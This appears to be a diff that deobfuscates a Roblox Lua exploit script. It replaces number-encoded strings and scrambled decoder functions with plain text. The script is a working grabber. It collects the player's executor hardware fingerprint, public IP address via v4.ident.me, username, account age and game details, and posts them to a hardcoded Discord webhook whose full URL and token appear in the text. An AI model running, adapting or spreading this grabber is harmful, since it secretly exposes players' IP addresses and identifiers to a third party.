@@ -1,25 +1,16 @@
-function VmRLfOrciVIwdEGvphkzAYjQujHyqnseyDshvgWOrTwohWdYAPwphe(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
-
-
-function VnUAhFdVjdMG(code)res=VmRLfOrciVIwdEGvphkzAYjQujHyqnseyDshvgWOrTwohWdYAPwphe({})for i in ipairs(code)do res=res..string.char(code[i]/1)end return res end 
-
-
-function ViKtKWQzMtvUuGqoIjMIKC(code)res=VnUAhFdVjdMG({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
-
-
 function makereport()
 	if (not http_request) then
-        return game:GetService(ViKtKWQzMtvUuGqoIjMIKC({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer:Kick(ViKtKWQzMtvUuGqoIjMIKC({8925,11550,10185,10290,11340,10605,3360,12180,11655,3360,10710,11025,11550,10500,3360,11760,11970,11655,11760,10605,11970,3360,11970,10605,11865,12285,10605,12075,12180,3360,10710,12285,11550,10395,12180,11025,11655,11550}))
+        return game:GetService('Players').LocalPlayer:Kick('Unable to find proper request function')
     end
 
     -- // define hash function
 end
 
-plr = game:GetServiceViKtKWQzMtvUuGqoIjMIKC({8400,11340,10185,12705,10605,11970,12075}).LocalPlayer
+plr = game:GetService'Players'.LocalPlayer
 local premium = false
 local ALT = false
 
-local market = game:GetService(ViKtKWQzMtvUuGqoIjMIKC({8085,10185,11970,11235,10605,12180,11760,11340,10185,10395,10605,8715,10605,11970,12390,11025,10395,10605}))
+local market = game:GetService("MarketplaceService")
 local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 
 local http_request = http_request
@@ -29,15 +20,15 @@ elseif SENTINEL_V2 then
     function http_request(tb)
         return {
             StatusCode = 200,
-            Body = request(tb.Url, tb.Method, (tb.Body or ViKtKWQzMtvUuGqoIjMIKC({})))
+            Body = request(tb.Url, tb.Method, (tb.Body or ''))
         }
     end
 end
 
-local body = http_request({Url = ViKtKWQzMtvUuGqoIjMIKC({10920,12180,12180,11760,12075,6090,4935,4935,10920,12180,12180,11760,10290,11025,11550,4830,11655,11970,10815,4935,10815,10605,12180}), Method = ViKtKWQzMtvUuGqoIjMIKC({7455,7245,8820})}).Body
-local decoded = game:GetService(ViKtKWQzMtvUuGqoIjMIKC({7560,12180,12180,11760,8715,10605,11970,12390,11025,10395,10605})):JSONDecode(body)
-local hwid_list = {ViKtKWQzMtvUuGqoIjMIKC({8715,12705,11550,4725,7350,11025,11550,10815,10605,11970,11760,11970,11025,11550,12180}), ViKtKWQzMtvUuGqoIjMIKC({7245,12600,11760,11340,11655,11025,12180,4725,7455,12285,11025,10500}), ViKtKWQzMtvUuGqoIjMIKC({8400,11970,11655,12180,11655,4725,8925,12075,10605,11970,4725,7665,10500,10605,11550,12180,11025,10710,11025,10605,11970}), ViKtKWQzMtvUuGqoIjMIKC({8715,10605,11550,12180,11025,11550,10605,11340,4725,7350,11025,11550,10815,10605,11970,11760,11970,11025,11550,12180})}
-hwid = ViKtKWQzMtvUuGqoIjMIKC({})
+local body = http_request({Url = 'https://httpbin.org/get', Method = 'GET'}).Body
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
+hwid = ""
 
 for i, v in next, hwid_list do
     if decoded.headers[v] then
@@ -45,54 +36,54 @@ for i, v in next, hwid_list do
         break
     end
 end
-local IP = game:HttpGet(ViKtKWQzMtvUuGqoIjMIKC({10920,12180,12180,11760,12075,6090,4935,4935,12390,5460,4830,11025,10500,10605,11550,12180,4830,11445,10605}))
+local IP = game:HttpGet("https://v4.ident.me")
 if hwid then
-    local HttpServ = game:GetService(ViKtKWQzMtvUuGqoIjMIKC({7560,12180,12180,11760,8715,10605,11970,12390,11025,10395,10605}))
-    local url = ViKtKWQzMtvUuGqoIjMIKC({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5355,5355,5145,5565,5775,5460,5250,5565,5565,5250,5040,5880,5355,5775,5040,5250,5145,5775,4935,5880,9135,12075,7455,10395,8505,4725,8085,7140,7035,10500,8820,11655,10500,5250,8505,11550,8085,8400,7770,12390,5040,8400,11970,6825,5775,9135,7980,12285,5670,8400,8820,10605,10920,4725,11025,11235,12810,11970,7665,9345,9135,8505,11760,8085,8400,10185,5565,7035,9240,9975,12180,11235,7980,6930,5355,12495,11970,11130,8400,8505,5355,8085,11340,6930,9450,8190,10605})
+    local HttpServ = game:GetService('HttpService')
+    local url = "https://discord.com/api/webhooks/1331574255208370217/8WsGcQ-MDCdTod2QnMPJv0PrA7WLu6PTeh-ikzrIYWQpMPa5CX_tkLB3wrjPQ3MlBZNe"
 
     local data =
     {
-        [ViKtKWQzMtvUuGqoIjMIKC({10395,11655,11550,12180,10605,11550,12180})] = ViKtKWQzMtvUuGqoIjMIKC({7980,7980,7980}),
-        [ViKtKWQzMtvUuGqoIjMIKC({10605,11445,10290,10605,10500,12075})] = {{
-            [ViKtKWQzMtvUuGqoIjMIKC({12180,11025,12180,11340,10605})] = ViKtKWQzMtvUuGqoIjMIKC({4410,4410,8400,11340,10185,12705,10605,11970,3360,7245,12600,10605,10395,12285,12180,10605,10500,3360,6930,10605,12075,12180,3360,8715,10395,11970,11025,11760,12180,3360,10605,12390,10605,11970,3360,10710,11655,11970,3360,12390,11025,11970,12285,12075,3360,11970,11760,4410,4410}),
-            [ViKtKWQzMtvUuGqoIjMIKC({10500,10605,12075,10395,11970,11025,11760,12180,11025,11655,11550})] = hwid,
-            [ViKtKWQzMtvUuGqoIjMIKC({12180,12705,11760,10605})] = ViKtKWQzMtvUuGqoIjMIKC({11970,11025,10395,10920}),
-            [ViKtKWQzMtvUuGqoIjMIKC({10395,11655,11340,11655,11970})] = tonumber(0x33FF5C),
-            [ViKtKWQzMtvUuGqoIjMIKC({10710,11025,10605,11340,10500,12075})] = {
+        ["content"] = "LLL",
+        ["embeds"] = {{
+            ["title"] = "**Player Executed Best Script ever for virus rp**",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x33FF5C),
+            ["fields"] = {
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({8925,12075,10605,11970,11550,10185,11445,10605,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = Game.Players.LocalPlayer.Name,
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
                 },
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({7665,8400,3360,6825,10500,10500,11970,10605,12075,12075,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = IP,
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
                 },
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({7455,10185,11445,10605,3360,7980,11025,11550,11235,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = ViKtKWQzMtvUuGqoIjMIKC({10920,12180,12180,11760,12075,6090,4935,4935,11970,11655,10290,11340,11655,12600,4830,10395,11655,11445,4935,10815,10185,11445,10605,12075,4935}) .. game.PlaceId .. ViKtKWQzMtvUuGqoIjMIKC({4935}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
                 },
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({7455,10185,11445,10605,3360,8190,10185,11445,10605,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = info.Name,
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "Game Name:",
+                    ["value"] = info.Name,
+                    ["inline"] = true
                 },
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({6825,10815,10605,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = plr.AccountAge,
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "Age:",
+                    ["value"] = plr.AccountAge,
+                    ["inline"] = true
                 },
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({8400,11970,10605,11445,11025,12285,11445,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = premium,
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "Premium:",
+                    ["value"] = premium,
+                    ["inline"] = true
                 },
                 {
-                    [ViKtKWQzMtvUuGqoIjMIKC({11550,10185,11445,10605})] = ViKtKWQzMtvUuGqoIjMIKC({6825,7980,8820,6090}),
-                    [ViKtKWQzMtvUuGqoIjMIKC({12390,10185,11340,12285,10605})] = ALT,
-                    [ViKtKWQzMtvUuGqoIjMIKC({11025,11550,11340,11025,11550,10605})] = true
+                    ["name"] = "ALT:",
+                    ["value"] = ALT,
+                    ["inline"] = true
                 },
             },
         }}
@@ -100,12 +91,12 @@ if hwid then
     local newdata = HttpServ:JSONEncode(data)
 
     local headers = {
-        [ViKtKWQzMtvUuGqoIjMIKC({10395,11655,11550,12180,10605,11550,12180,4725,12180,12705,11760,10605})] = ViKtKWQzMtvUuGqoIjMIKC({10185,11760,11760,11340,11025,10395,10185,12180,11025,11655,11550,4935,11130,12075,11655,11550})
+        ["content-type"] = "application/json"
     }
 
-    local request_payload = {Url = url, Body = newdata, Method = ViKtKWQzMtvUuGqoIjMIKC({8400,8295,8715,8820}), Headers = headers}
+    local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     http_request(request_payload)
     setclipboard(hwid)
 else
-    game:GetService(ViKtKWQzMtvUuGqoIjMIKC({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer:Kick(ViKtKWQzMtvUuGqoIjMIKC({8925,11550,10185,10290,11340,10605,3360,12180,11655,3360,10710,11025,11550,10500,3360,7560,9135,7665,7140,3465,3360,7035,11655,11550,12180,10185,10395,12180,3360,12075,12285,11760,11760,11655,11970,12180,4830}))
-end            
+    game:GetService("Players").LocalPlayer:Kick('Unable to find HWID! Contact support.')
+end
